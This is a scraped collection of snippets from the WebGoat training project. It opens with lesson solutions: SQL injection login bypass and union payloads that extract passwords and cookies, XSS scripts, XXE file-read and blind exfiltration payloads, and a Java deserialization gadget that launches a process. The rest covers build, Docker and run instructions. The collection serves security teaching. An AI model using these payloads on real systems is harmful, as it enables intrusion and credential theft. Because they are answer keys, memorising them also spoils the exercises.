[
  {
    "owner": "webgoat",
    "repo": "webgoat",
    "content": "TITLE: SQL Injection Attack Payloads\nDESCRIPTION: Various SQL injection payloads demonstrating basic authentication bypass and union-based data extraction from user tables.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/src/main/resources/lessons/sol.txt#2025-04-14_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSmith' or '1'='1\nSmith' union select userid,user_name, password,cookie,cookie, cookie,userid from user_system_data --\nSmith' union select all 1, '2' ,user_name,password, 'MC', cookie, 2 from user_system_data --\n```\n\n----------------------------------------\n\nTITLE: Cross-Site Scripting (XSS) Attacks\nDESCRIPTION: Various XSS payload examples including basic alert scripts and DOM-based XSS attacks.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/src/main/resources/lessons/sol.txt#2025-04-14_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n<script>alert('my javascript here')</script>4128 3214 0002 1999\n\n// http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E\n```\n\n----------------------------------------\n\nTITLE: XXE Payload Examples\nDESCRIPTION: XML External Entity (XXE) attack payloads for file system access and data exfiltration, including both basic and blind XXE examples.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/src/main/resources/lessons/sol.txt#2025-04-14_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><comment><text>&root;</text></comment>\n\n<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><user>  <username>&root;</username><password>test</password></user>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Component Exploitation\nDESCRIPTION: Examples of exploiting vulnerable components including jQuery XSS and Java deserialization attacks.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/src/main/resources/lessons/sol.txt#2025-04-14_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<sorted-set>\n <string>foo</string>\n <dynamic-proxy>\n   <interface>java.lang.Comparable</interface>\n   <handler class=\"java.beans.EventHandler\">\n     <target class=\"java.lang.ProcessBuilder\">\n       <command>\n         <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>\n       </command>\n     </target>\n     <action>start</action>\n   </handler>\n </dynamic-proxy>\n</sorted-set>\n```\n\n----------------------------------------\n\nTITLE: Blind XXE Attack Implementation\nDESCRIPTION: Complex XXE attack using external DTD to exfiltrate file contents through HTTP requests.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/src/main/resources/lessons/sol.txt#2025-04-14_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY % file SYSTEM \"file:///c:/windows-version.txt\">\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>\">\n%all;\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % remote SYSTEM \"http://localhost:8080/WebGoat/plugin_lessons/XXE/test.dtd\">\n%remote;\n]>\n<user>\n  <username>test&send;</username>\n</user>\n```\n\n----------------------------------------\n\nTITLE: Analyzing JWT Authentication Log Entries\nDESCRIPTION: These log entries showcase HTTP requests related to JWT authentication, including successful and failed attempts. The logs contain information such as IP addresses, timestamps, request methods, URLs, response codes, and user agents.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/src/main/resources/lessons/jwt/images/logs.txt#2025-04-14_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] \"GET /JWT/refresh/checkout?token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q HTTP/1.1\" 401 242 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\" \"-\"\n194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] \"POST /JWT/refresh/moveToCheckout HTTP/1.1\" 200 12783 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\" \"-\"\n194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] \"POST /JWT/refresh/login HTTP/1.1\" 200 212 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\" \"-\"\n194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] \"GET /JWT/refresh/addItems HTTP/1.1\" 404 249 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\" \"-\"\n195.206.170.15 - - [28/Jan/2016:21:28:01 +0100] \"POST /JWT/refresh/moveToCheckout HTTP/1.1\" 404 215 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\" \"-\"\n```\n\n----------------------------------------\n\nTITLE: Building WebGoat from Source\nDESCRIPTION: These commands clone the WebGoat repository, checkout a specific branch, and build the project using Maven.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone git@github.com:WebGoat/WebGoat.git\ncd WebGoat\ngit checkout <<branch_name>>\n# On Linux/Mac:\n./mvnw clean install\n\n# On Windows:\n./mvnw.cmd clean install\n\n# Using docker or podman, you can than build the container locally\ndocker build -f Dockerfile . -t webgoat/webgoat\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat from Source\nDESCRIPTION: These commands run WebGoat from source using Spring Boot after building the project.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n# On Linux/Mac:\n./mvnw spring-boot:run\n# On Windows:\n./mvnw.cmd spring-boot:run\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat Docker Container\nDESCRIPTION: This command runs the WebGoat Docker container, exposing the necessary ports for WebGoat and WebWolf. It also demonstrates how to set the timezone environment variable.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ndocker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=America/Boise webgoat/webgoat\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat Docker Container with Custom Host Entries\nDESCRIPTION: This command runs the WebGoat Docker container with custom host entries for WebGoat and WebWolf, allowing the use of a proxy like OWASP ZAP.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ndocker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e WEBGOAT_HOST=www.webgoat.local -e WEBWOLF_HOST=www.webwolf.local -e TZ=America/Boise webgoat/webgoat\n```\n\n----------------------------------------\n\nTITLE: Adding Git Remote Upstream Repository for WebGoat\nDESCRIPTION: Commands for configuring the remote upstream repository after forking WebGoat. Shows how to verify current remotes and add the upstream repository for syncing with the main project.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/CONTRIBUTING.md#2025-04-14_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ git remote -v\norigin git@github.com:<your Github handle>/WebGoat.git (fetch)\norigin git@github.com:<your Github handle>/WebGoat.git (push)\n\n$ git remote add upstream git@github.com:WebGoat/WebGoat.git\n\n$ git remote -v\norigin git@github.com:<your Github handle>/WebGoat.git (fetch)\norigin git@github.com:<your Github handle>/WebGoat.git (push)\nupstream git@github.com:OWASP/WebGoat.git (fetch)\nupstream git@github.com:OWASP/WebGoat.git (push)\n```\n\n----------------------------------------\n\nTITLE: Syncing Local Repository with Upstream WebGoat\nDESCRIPTION: Commands for keeping a local repository synchronized with the upstream WebGoat repository. Essential for maintaining an up-to-date codebase when contributing.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/CONTRIBUTING.md#2025-04-14_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ git fetch upstream\n$ git merge upstream/main\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat Desktop Docker Container\nDESCRIPTION: This command runs the WebGoat Desktop Docker container, which provides a complete Linux desktop environment in the browser.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ndocker run -p 127.0.0.1:3000:3000 webgoat/webgoat-desktop\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat Standalone JAR\nDESCRIPTION: This command runs the WebGoat standalone JAR file, setting the timezone and file encoding.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nexport TZ=Europe/Amsterdam # or your timezone\njava -Dfile.encoding=UTF-8 -jar webgoat-2023.8.jar\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat on Custom Ports\nDESCRIPTION: This command demonstrates how to run WebGoat on custom ports for both WebGoat and WebWolf applications.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\njava -jar webgoat-2023.8.jar --webgoat.port=8001 --webwolf.port=8002\n```\n\n----------------------------------------\n\nTITLE: Starting WebGoat and ZAP applications in Ubuntu terminal\nDESCRIPTION: Commands to launch WebGoat and ZAP security tools from a terminal. These shell commands execute scripts that initialize the applications for web security testing and learning.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/config/desktop/WebGoat.txt#2025-04-14_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./start_webgoat.sh\n./start_zap.sh\n```\n\n----------------------------------------\n\nTITLE: Executing WebGoat Release Process in Bash\nDESCRIPTION: A sequence of commands to perform a WebGoat release. This includes setting the version in Maven, updating release notes, verifying the build, committing changes, tagging the release, and pushing to the repository.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/CREATE_RELEASE.md#2025-04-14_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nmvn versions:set\n<< update release notes >>\nmvn verify\ngit commit ....\ngit tag v2023.01\ngit push --tags\ngit push\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat with Custom Menu Configuration\nDESCRIPTION: This command demonstrates how to run WebGoat with a customized menu by excluding certain categories and lessons using environment variables.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nexport TZ=Europe/Amsterdam # or your timezone\nexport EXCLUDE_CATEGORIES=\"CLIENT_SIDE,GENERAL,CHALLENGE\"\nexport EXCLUDE_LESSONS=\"SqlInjectionAdvanced,SqlInjectionMitigations\"\njava -jar target/webgoat-2023.8-SNAPSHOT.jar\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat Docker with Custom Menu Configuration\nDESCRIPTION: This command runs the WebGoat Docker container with a customized menu by excluding certain categories and lessons using environment variables.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ndocker run -d -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e EXCLUDE_CATEGORIES=\"CLIENT_SIDE,GENERAL,CHALLENGE\" -e EXCLUDE_LESSONS=\"SqlInjectionAdvanced,SqlInjectionMitigations\" webgoat/webgoat\n```\n\n----------------------------------------\n\nTITLE: Configuring WebGoat Server Address\nDESCRIPTION: This code snippet shows how to change the IP address WebGoat binds to by modifying the application.properties file.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/README.md#2025-04-14_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\nserver.address=x.x.x.x\n```\n\n----------------------------------------\n\nTITLE: Running WebGoat with Modified Logging for Integration Test Troubleshooting\nDESCRIPTION: Command-line instruction to run WebGoat JAR file with a modification to fix integration test failures. The solution involves removing the logging pattern configuration parameter from the command line.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/FAQ.md#2025-04-14_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\njava -jar ...\n```\n\n----------------------------------------\n\nTITLE: Rendering WebWolf ASCII Art Logo\nDESCRIPTION: An ASCII art representation of 'WebWolf' created using underscores, backslashes, forward slashes, pipes, and letters. The logo spans 5 lines and uses spacing and various ASCII characters to create a stylized text effect.\nSOURCE: https://github.com/WebGoat/WebGoat/blob/main/src/main/resources/banner-webwolf.txt#2025-04-14_snippet_0\n\nLANGUAGE: ascii-art\nCODE:\n```\n __        __   _  __        __    _  __\n \\ \\      / /__| |_\\ \\      / /__ | |/ _|\n  \\ \\ /\\ / / _ \\ '_ \\ \\ /\\ / / _ \\| | |_\n   \\ V  V /  __/ |_) \\ V  V / (_) | |  _|\n    \\_/\\_/ \\___|_.__/ \\_/\\_/ \\___/|_|_|\n```"
  }
]